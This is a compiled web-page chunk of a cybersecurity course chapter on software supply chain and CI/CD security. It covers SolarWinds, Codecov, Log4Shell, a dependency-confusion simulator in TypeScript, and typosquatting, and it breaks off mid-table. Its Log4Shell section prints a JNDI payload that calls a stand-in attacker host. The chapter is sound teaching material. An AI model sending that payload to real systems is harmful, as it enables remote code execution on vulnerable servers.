@@ -1,0 +1,2153 @@
+"use strict";
+(globalThis["webpackChunksite"] = globalThis["webpackChunksite"] || []).push([[13331],{
+
+/***/ 95397
+(__unused_webpack_module, __webpack_exports__, __webpack_require__) {
+
+// ESM COMPAT FLAG
+__webpack_require__.r(__webpack_exports__);
+
+// EXPORTS
+__webpack_require__.d(__webpack_exports__, {
+  assets: () => (/* binding */ assets),
+  contentTitle: () => (/* binding */ contentTitle),
+  "default": () => (/* binding */ MDXContent),
+  frontMatter: () => (/* binding */ frontMatter),
+  metadata: () => (/* reexport */ site_docs_courses_cyber_security_16_supply_chain_cicd_md_e23_namespaceObject),
+  toc: () => (/* binding */ toc)
+});
+
+;// ./.docusaurus/docusaurus-plugin-content-docs/default/site-docs-courses-cyber-security-16-supply-chain-cicd-md-e23.json
+const site_docs_courses_cyber_security_16_supply_chain_cicd_md_e23_namespaceObject = /*#__PURE__*/JSON.parse('{"id":"courses/cyber-security/16-supply-chain-cicd","title":"Chapter 16: Supply Chain & CI/CD Pipeline Security","description":"---","source":"@site/docs/courses/cyber-security/16-supply-chain-cicd.md","sourceDirName":"courses/cyber-security","slug":"/cyber-security/16-supply-chain-cicd","permalink":"/ai-engineering-journey/cyber-security/16-supply-chain-cicd","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":15,"frontMatter":{"id":"16-supply-chain-cicd","slug":"/cyber-security/16-supply-chain-cicd","title":"Chapter 16: Supply Chain & CI/CD Pipeline Security","sidebar_label":"Chapter 16: Supply Chain & CI/CD Pipeline Security","sidebar_position":15},"sidebar":"course-cyber-security","previous":{"title":"Chapter 15: OT/ICS & SCADA Security","permalink":"/ai-engineering-journey/cyber-security/15-ot-ics-scada"},"next":{"title":"Chapter 17: AI Security, Adversarial Machine Learning & Deepfakes","permalink":"/ai-engineering-journey/cyber-security/17-ai-security-adversarial-ml"}}');
+// EXTERNAL MODULE: ./node_modules/react/jsx-runtime.js
+var jsx_runtime = __webpack_require__(74848);
+// EXTERNAL MODULE: ./node_modules/@mdx-js/react/lib/index.js
+var lib = __webpack_require__(28453);
+;// ./docs/courses/cyber-security/16-supply-chain-cicd.md
+
+
+const frontMatter = {
+	id: '16-supply-chain-cicd',
+	slug: '/cyber-security/16-supply-chain-cicd',
+	title: 'Chapter 16: Supply Chain & CI/CD Pipeline Security',
+	sidebar_label: 'Chapter 16: Supply Chain & CI/CD Pipeline Security',
+	sidebar_position: 15
+};
+const contentTitle = 'Chapter 16: Supply Chain & CI/CD Pipeline Security';
+
+const assets = {
+
+};
+
+/*End Image Gallery*/
+
+
+const toc = [{
+  "value": "Learning Objectives",
+  "id": "learning-objectives",
+  "level": 2
+}, {
+  "value": "16.1 The Software Supply Chain Threat Landscape",
+  "id": "161-the-software-supply-chain-threat-landscape",
+  "level": 2
+}, {
+  "value": "16.1.1 Why Supply Chain Attacks Are Rising",
+  "id": "1611-why-supply-chain-attacks-are-rising",
+  "level": 3
+}, {
+  "value": "16.1.2 Anatomy of a Supply Chain Attack",
+  "id": "1612-anatomy-of-a-supply-chain-attack",
+  "level": 3
+}, {
+  "value": "16.2 Major Supply Chain Attacks — Technical Deep Dive",
+  "id": "162-major-supply-chain-attacks--technical-deep-dive",
+  "level": 2
+}, {
+  "value": "16.2.1 SolarWinds (Sunburst) Attack — 2020",
+  "id": "1621-solarwinds-sunburst-attack--2020",
+  "level": 3
+}, {
+  "value": "16.2.2 Codecov Breach — 2021",
+  "id": "1622-codecov-breach--2021",
+  "level": 3
+}, {
+  "value": "16.2.3 Log4j (Log4Shell) — CVE-2021-44228",
+  "id": "1623-log4j-log4shell--cve-2021-44228",
+  "level": 3
+}, {
+  "value": "16.2.4 Dependency Confusion",
+  "id": "1624-dependency-confusion",
+  "level": 3
+}, {
+  "value": "16.2.5 Typosquatting and Malicious Packages",
+  "id": "1625-typosquatting-and-malicious-packages",
+  "level": 3
+}, {
+  "value": "16.3 Software Bill of Materials (SBOM)",
+  "id": "163-software-bill-of-materials-sbom",
+  "level": 2
+}, {
+  "value": "16.3.1 SBOM Formats",
+  "id": "1631-sbom-formats",
+  "level": 3
+}, {
+  "value": "16.3.2 CycloneDX SBOM Generator (TypeScript)",
+  "id": "1632-cyclonedx-sbom-generator-typescript",
+  "level": 3
+}, {
+  "value": "16.3.3 SBOM Validation",
+  "id": "1633-sbom-validation",
+  "level": 3
+}, {
+  "value": "16.4 Dependency Security Analysis",
+  "id": "164-dependency-security-analysis",
+  "level": 2
+}, {
+  "value": "16.4.1 Dependency Vulnerability Checker (TypeScript)",
+  "id": "1641-dependency-vulnerability-checker-typescript",
+  "level": 3
+}, {
+  "value": "16.4.2 Transitive Dependency Risks",
+  "id": "1642-transitive-dependency-risks",
+  "level": 3
+}, {
+  "value": "16.5 CI/CD Pipeline Hardening",
+  "id": "165-cicd-pipeline-hardening",
+  "level": 2
+}, {
+  "value": "16.5.1 CI/CD Pipeline Security Architecture",
+  "id": "1651-cicd-pipeline-security-architecture",
+  "level": 3
+}, {
+  "value": "16.5.2 CI/CD Pipeline Security Auditor (TypeScript)",
+  "id": "1652-cicd-pipeline-security-auditor-typescript",
+  "level": 3
+}, {
+  "value": "16.5.3 CI/CD Pipeline Hardening Checklist",
+  "id": "1653-cicd-pipeline-hardening-checklist",
+  "level": 3
+}, {
+  "value": "16.6 Artifact Integrity and Signing",
+  "id": "166-artifact-integrity-and-signing",
+  "level": 2
+}, {
+  "value": "16.6.1 Sigstore / Cosign",
+  "id": "1661-sigstore--cosign",
+  "level": 3
+}, {
+  "value": "Cosign Container Signature Verifier (TypeScript)",
+  "id": "cosign-container-signature-verifier-typescript",
+  "level": 4
+}, {
+  "value": "16.6.2 Software Artifact Hash Verifier (TypeScript)",
+  "id": "1662-software-artifact-hash-verifier-typescript",
+  "level": 3
+}, {
+  "value": "16.7 SLSA — Supply Chain Levels for Software Artifacts",
+  "id": "167-slsa--supply-chain-levels-for-software-artifacts",
+  "level": 2
+}, {
+  "value": "16.7.1 SLSA Levels",
+  "id": "1671-slsa-levels",
+  "level": 3
+}, {
+  "value": "16.7.2 SLSA Requirements Summary",
+  "id": "1672-slsa-requirements-summary",
+  "level": 3
+}, {
+  "value": "16.7.3 SLSA Provenance Attestation Builder (TypeScript)",
+  "id": "1673-slsa-provenance-attestation-builder-typescript",
+  "level": 3
+}, {
+  "value": "16.8 DevSecOps Integration",
+  "id": "168-devsecops-integration",
+  "level": 2
+}, {
+  "value": "16.8.1 Security Tools Integration",
+  "id": "1681-security-tools-integration",
+  "level": 3
+}, {
+  "value": "16.8.2 DevSecOps Integration Checklist",
+  "id": "1682-devsecops-integration-checklist",
+  "level": 3
+}, {
+  "value": "16.8.3 Dependency Confusion Scanner (TypeScript)",
+  "id": "1683-dependency-confusion-scanner-typescript",
+  "level": 3
+}, {
+  "value": "Practical Takeaways",
+  "id": "practical-takeaways",
+  "level": 2
+}, {
+  "value": "Summary",
+  "id": "summary",
+  "level": 2
+}, {
+  "value": "Chapter Quiz — Supply Chain &amp; CI/CD Pipeline Security",
+  "id": "chapter-quiz--supply-chain--cicd-pipeline-security",
+  "level": 2
+}, {
+  "value": "Exercises",
+  "id": "exercises",
+  "level": 2
+}, {
+  "value": "Exercise 1: SBOM Analysis and Validation",
+  "id": "exercise-1-sbom-analysis-and-validation",
+  "level": 3
+}, {
+  "value": "Exercise 2: CI/CD Pipeline Security Audit",
+  "id": "exercise-2-cicd-pipeline-security-audit",
+  "level": 3
+}, {
+  "value": "Exercise 3: Dependency Confusion Defense",
+  "id": "exercise-3-dependency-confusion-defense",
+  "level": 3
+}, {
+  "value": "Exercise 4: Container Image Signing and Verification",
+  "id": "exercise-4-container-image-signing-and-verification",
+  "level": 3
+}, {
+  "value": "Exercise 5: Full SLSA L3 Pipeline Implementation",
+  "id": "exercise-5-full-slsa-l3-pipeline-implementation",
+  "level": 3
+}, {
+  "value": "Exercise 6: Vulnerability Scanning Automation",
+  "id": "exercise-6-vulnerability-scanning-automation",
+  "level": 3
+}, {
+  "value": "Exercise 7: Package Manager Security Analysis",
+  "id": "exercise-7-package-manager-security-analysis",
+  "level": 3
+}, {
+  "value": "Exercise 8: in-toto Attestation Chain Verification",
+  "id": "exercise-8-in-toto-attestation-chain-verification",
+  "level": 3
+}, {
+  "value": "References",
+  "id": "references",
+  "level": 2
+}];
+function _createMdxContent(props) {
+  const _components = {
+    a: "a",
+    code: "code",
+    details: "details",
+    h1: "h1",
+    h2: "h2",
+    h3: "h3",
+    h4: "h4",
+    header: "header",
+    hr: "hr",
+    img: "img",
+    li: "li",
+    ol: "ol",
+    p: "p",
+    pre: "pre",
+    section: "section",
+    span: "span",
+    strong: "strong",
+    summary: "summary",
+    table: "table",
+    tbody: "tbody",
+    td: "td",
+    th: "th",
+    thead: "thead",
+    tr: "tr",
+    ul: "ul",
+    ...(0,lib/* useMDXComponents */.R)(),
+    ...props.components
+  };
+  return (0,jsx_runtime.jsxs)(jsx_runtime.Fragment, {
+    children: [(0,jsx_runtime.jsx)(_components.header, {
+      children: (0,jsx_runtime.jsx)(_components.h1, {
+        id: "chapter-16-supply-chain--cicd-pipeline-security",
+        children: "Chapter 16: Supply Chain & CI/CD Pipeline Security"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "learning-objectives",
+      children: "Learning Objectives"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "By the end of this chapter, you will be able to:"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.section, {
+      className: "lesson-visuals",
+      "aria-label": "Visual learning resources",
+      children: ["\n  ", (0,jsx_runtime.jsxs)(_components.header, {
+        children: [(0,jsx_runtime.jsx)(_components.span, {
+          children: "VISUAL LEARNING"
+        }), (0,jsx_runtime.jsx)(_components.h2, {
+          children: "See it. Review it. Remember it."
+        })]
+      }), "\n  ", (0,jsx_runtime.jsxs)(_components.a, {
+        className: "lesson-visual-card",
+        href: "../../assets/images/lessons/cyber-security/16-supply-chain-cicd/handwritten-notes.png",
+        target: "_blank",
+        rel: "noopener",
+        children: ["\n    ", (0,jsx_runtime.jsx)(_components.img, {
+          src: "../../assets/images/lessons/cyber-security/16-supply-chain-cicd/handwritten-notes.png",
+          alt: "Handwritten notes",
+          loading: "lazy"
+        }), "\n    ", (0,jsx_runtime.jsxs)(_components.span, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "Handwritten notes"
+          }), "Condensed notes for deliberate review."]
+        }), "\n  "]
+      }), "\n  ", (0,jsx_runtime.jsxs)(_components.a, {
+        className: "lesson-visual-card",
+        href: "../../assets/images/lessons/cyber-security/16-supply-chain-cicd/sticky-notes.png",
+        target: "_blank",
+        rel: "noopener",
+        children: ["\n    ", (0,jsx_runtime.jsx)(_components.img, {
+          src: "../../assets/images/lessons/cyber-security/16-supply-chain-cicd/sticky-notes.png",
+          alt: "Sticky-note revision",
+          loading: "lazy"
+        }), "\n    ", (0,jsx_runtime.jsxs)(_components.span, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "Sticky-note revision"
+          }), "Fast recall prompts for revision."]
+        }), "\n  "]
+      }), "\n  ", (0,jsx_runtime.jsxs)(_components.a, {
+        className: "lesson-visual-card",
+        href: "../../assets/images/lessons/cyber-security/16-supply-chain-cicd/visual-explanation.png",
+        target: "_blank",
+        rel: "noopener",
+        children: ["\n    ", (0,jsx_runtime.jsx)(_components.img, {
+          src: "../../assets/images/lessons/cyber-security/16-supply-chain-cicd/visual-explanation.png",
+          alt: "Visual concept guide",
+          loading: "lazy"
+        }), "\n    ", (0,jsx_runtime.jsxs)(_components.span, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "Visual concept guide"
+          }), "A connected explanation of the key ideas."]
+        }), "\n  "]
+      }), "\n"]
+    }), "\n", "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Analyze"
+        }), " real-world software supply chain attacks (SolarWinds, Codecov, log4j) and identify the technical vectors used."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Generate and validate"
+        }), " SBOM (Software Bill of Materials) documents in SPDX and CycloneDX formats."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Implement"
+        }), " dependency vulnerability scanning using tools like npm audit, Snyk, and OWASP Dependency Check."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Harden"
+        }), " CI/CD pipelines against common attack vectors including secret leakage, runner compromise, and dependency confusion."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Apply"
+        }), " artifact integrity verification using Sigstore, Cosign, and TUF."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Integrate"
+        }), " DevSecOps tooling (SAST, DAST, secrets scanning, container scanning) into automated pipelines."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Implement"
+        }), " SLSA provenance attestation at various maturity levels (L0–L4)."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Build"
+        }), " TypeScript utilities for SBOM generation, vulnerability auditing, pipeline security auditing, and dependency confusion detection."]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "161-the-software-supply-chain-threat-landscape",
+      children: "16.1 The Software Supply Chain Threat Landscape"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Modern software development relies on an intricate web of dependencies, build tools, CI/CD pipelines, package registries, and distribution mechanisms. Each link in this chain represents a potential attack surface. The software supply chain encompasses everything from the upstream open-source libraries you import to the container images you deploy and the pipeline that builds them."
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1611-why-supply-chain-attacks-are-rising",
+      children: "16.1.1 Why Supply Chain Attacks Are Rising"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Supply chain attacks have surged because they offer attackers multiplicative returns. Compromising a single upstream dependency can infect thousands of downstream consumers. The 2024 Sonatype State of the Software Supply Chain report documented a 742% average annual increase in software supply chain attacks over the past five years. Key drivers include:"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Open-source ubiquity"
+        }), ": Over 90% of modern applications use open-source components, with the average project containing over 500 transitive dependencies."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Automated consumption"
+        }), ": CI/CD pipelines and package managers automatically pull dependencies, often without integrity verification."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Trust delegation"
+        }), ": Developers implicitly trust package registries, maintainers, and build infrastructure."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Complex dependency graphs"
+        }), ": A single top-level dependency can pull in dozens of transitive dependencies, creating an opaque attack surface."]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1612-anatomy-of-a-supply-chain-attack",
+      children: "16.1.2 Anatomy of a Supply Chain Attack"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "The following Mermaid diagram illustrates the typical attack chain in a software supply chain compromise:"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-mermaid",
+        children: "flowchart LR\n    A[Attacker] -->|1. Compromise upstream| B[Package Registry / Repo]\n    B -->|2. Inject malicious code| C[Compromised Package v2.1.3]\n    C -->|3. Pulled by CI/CD| D[Developer's Build Pipeline]\n    D -->|4. Build includes backdoor| E[Artifact / Container Image]\n    E -->|5. Signed & Published| F[Production Registry]\n    F -->|6. Deployed to| G[Customer Environment]\n    G -->|7. Beacon home| A\n    A -->|8. Exfiltrate data / Ransomware| G\n\n    style A fill:#ff4444,color:#fff\n    style C fill:#ff4444,color:#fff\n    style G fill:#ffcc00,color:#000\n"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Figure 16.1"
+      }), ": Supply chain attack chain showing the cascading effect of a single compromised upstream package."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "162-major-supply-chain-attacks--technical-deep-dive",
+      children: "16.2 Major Supply Chain Attacks — Technical Deep Dive"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1621-solarwinds-sunburst-attack--2020",
+      children: "16.2.1 SolarWinds (Sunburst) Attack — 2020"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "The SolarWinds attack remains the most sophisticated software supply chain compromise in history. Attackers affiliated with APT29 (Cozy Bear) compromised SolarWinds' build infrastructure and inserted a backdoor into Orion software updates."
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Technical details:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "Initial compromise"
+          }), ": Attackers gained access to SolarWinds' internal systems, likely through a compromised VPN credential or a spear-phishing attack."]
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "Build pipeline injection"
+          }), ": Malicious code was inserted into the ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "Orion.Core.BusinessLayer.dll"
+          }), " assembly during the build process. The attackers modified the source code in SolarWinds' build environment to include a backdoor component."]
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "The Sunburst backdoor"
+          }), ": The injected code used a domain generation algorithm (DGA) to beacon to command-and-control (C2) servers. The code was designed to:"]
+        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+            children: "Sleep for 12–14 days before beaconing (evading sandbox detection)."
+          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+            children: "Use multiple C2 domains with DNS-based communication."
+          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+            children: "Accept \"jobs\" (arbitrary code execution) delivered via DNS responses."
+          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+            children: "Employ multiple anti-analysis techniques including C2 domain hashing and delayed activation."
+          }), "\n"]
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "Supply chain propagation"
+          }), ": SolarWinds digitally signed the compromised Orion binaries using their legitimate code-signing certificate. This meant that customers' systems trusted the updates automatically."]
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "Downstream impact"
+          }), ": Approximately 18,000 organizations downloaded the compromised update. High-value targets included US federal agencies (Treasury, Commerce, DHS, Energy), cybersecurity firms (FireEye), and Fortune 500 companies."]
+        }), "\n"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Key lessons for CI/CD security:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Build pipeline integrity must be maintained at the highest level."
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Code signing alone does not verify that the code being signed is trustworthy."
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Supply chain monitoring must include behavioral analysis, not just signature verification."
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "SBOMs would have allowed organizations to rapidly identify if they were using Orion."
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1622-codecov-breach--2021",
+      children: "16.2.2 Codecov Breach — 2021"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "In April 2021, attackers modified the Codecov Bash Uploader script to exfiltrate environment variables from CI/CD pipelines."
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Attack mechanics:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-mermaid",
+        children: "flowchart LR\n    A[Attacker] -->|1. Compromise Codecov GCP account| B[Codecov Docker Image]\n    B -->|2. Modify uploader.sh| C[Bash Uploader Script]\n    C -->|3. Developer runs CI build| D[CI Pipeline]\n    D -->|4. uploader.sh sourced| E[CI Environment]\n    E -->|5. Exfiltrated env vars| F[Attacker C2]\n    F -->|6. Access cloud credentials| G[AWS / GCP / GitHub]\n\n    style A fill:#ff4444,color:#fff\n    style F fill:#ff4444,color:#fff\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Technical impact:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "The modified Bash Uploader script sent environment variables from CI runners to the attacker's server."
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Thousands of organizations that used Codecov had their CI secrets, cloud credentials, and private keys exposed."
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Affected companies included Confluent, HashiCorp, and Twilio."
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "The breach demonstrated that even security tools can become attack vectors."
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1623-log4j-log4shell--cve-2021-44228",
+      children: "16.2.3 Log4j (Log4Shell) — CVE-2021-44228"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "The Log4j vulnerability is a critical remote code execution (RCE) flaw in the Apache Log4j 2 Java logging library. While not a supply chain attack in the traditional sense, its impact was amplified by the software supply chain."
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Technical RCE chain:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "1. User input: ${jndi:ldap://attacker.com/evil-class}\n   ↓\n2. Log4j parses JNDI lookup in log message\n   ↓\n3. JNDI lookup resolves via LDAP to attacker-controlled server\n   ↓\n4. Attacker server responds with serialized Java class\n   ↓\n5. Log4j deserializes and executes arbitrary code\n   ↓\n6. Complete system compromise\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Supply chain implications:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Log4j is an Apache Software Foundation project used by millions of applications."
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "The vulnerability was introduced in Log4j 2.0 (2014) and existed for 7 years before discovery."
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Organizations had to urgently inventory all uses of Log4j across their software supply chain."
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Many organizations discovered Log4j as a transitive dependency (e.g., a library they used depended on Log4j)."
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "This event was a watershed moment for SBOM adoption."
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1624-dependency-confusion",
+      children: "16.2.4 Dependency Confusion"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Dependency confusion (also called namespace confusion) occurs when a package manager installs a package from a public registry instead of a private registry because the public package has a higher version number."
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Classic attack flow:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-typescript",
+        children: "/**\n * Simulates a dependency confusion attack scenario.\n * Demonstrates how npm resolves package versions when\n * both a private and public registry have the same package name.\n */\ninterface RegistryResolution {\n  packageName: string;\n  privateVersion: string | null;\n  publicVersion: string | null;\n  resolvedFrom: 'private' | 'public';\n  isExploitable: boolean;\n}\n\ninterface DependencyConfusionVerdict {\n  packageName: string;\n  resolution: RegistryResolution;\n  riskLevel: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'NONE';\n  recommendation: string;\n}\n\nfunction simulateDependencyConfusion(\n  packageName: string,\n  privateVersion: string | null,\n  publicVersion: string | null,\n  npmScopeConfigured: boolean\n): DependencyConfusionVerdict {\n  const resolution: RegistryResolution = {\n    packageName,\n    privateVersion,\n    publicVersion,\n    resolvedFrom: 'public',\n    isExploitable: false,\n  };\n\n  // If no scoped registry is configured and the public version\n  // is higher, npm installs from public registry (attack scenario)\n  if (!npmScopeConfigured && publicVersion !== null) {\n    resolution.resolvedFrom = 'public';\n    resolution.isExploitable = true;\n\n    if (privateVersion !== null) {\n      const compareVersions = (a: string, b: string): number => {\n        const partsA = a.split('.').map(Number);\n        const partsB = b.split('.').map(Number);\n        for (let i = 0; i < Math.max(partsA.length, partsB.length); i++) {\n          const aVal = partsA[i] ?? 0;\n          const bVal = partsB[i] ?? 0;\n          if (aVal !== bVal) return aVal - bVal;\n        }\n        return 0;\n      };\n      if (publicVersion !== null && compareVersions(publicVersion, privateVersion) > 0) {\n        resolution.isExploitable = true;\n      }\n    }\n  }\n\n  const riskMap: Record<string, DependencyConfusionVerdict['riskLevel']> = {\n    true: 'CRITICAL',\n    false: 'LOW',\n  };\n\n  const verdict: DependencyConfusionVerdict = {\n    packageName,\n    resolution,\n    riskLevel: riskMap[String(resolution.isExploitable)],\n    recommendation: resolution.isExploitable\n      ? `Package \"${packageName}\" resolves to the public registry. `\n        + `Use @scope/package naming or configure .npmrc to scope this package to your private registry.`\n      : `Package \"${packageName}\" resolves safely to private registry.`,\n  };\n\n  return verdict;\n}\n\n// Demonstration\nconst verdict1 = simulateDependencyConfusion(\n  'internal-auth-lib',\n  '1.2.0',\n  '99.0.0', // Attacker published this high version publicly\n  false     // No npm scope configured — VULNERABLE\n);\nconsole.log('[Dependency Confusion]', verdict1);\n// Output: riskLevel: 'CRITICAL', resolvedFrom: 'public'\n\nconst verdict2 = simulateDependencyConfusion(\n  '@company/internal-auth-lib',\n  '1.2.0',\n  '99.0.0',\n  true // Scoped package — SAFE\n);\nconsole.log('[Scoped Package Safe]', verdict2);\n// Output: riskLevel: 'LOW', resolvedFrom: 'private'\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1625-typosquatting-and-malicious-packages",
+      children: "16.2.5 Typosquatting and Malicious Packages"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Attackers publish packages with names that are slight misspellings of popular packages:"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Legitimate Package"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Typosquatted Variant"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Impact"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.code, {
+              children: "lodash"
+            })
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.code, {
+              children: "l0dash"
+            }), " (letter O → zero)"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Data exfiltration"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.code, {
+              children: "babel-core"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
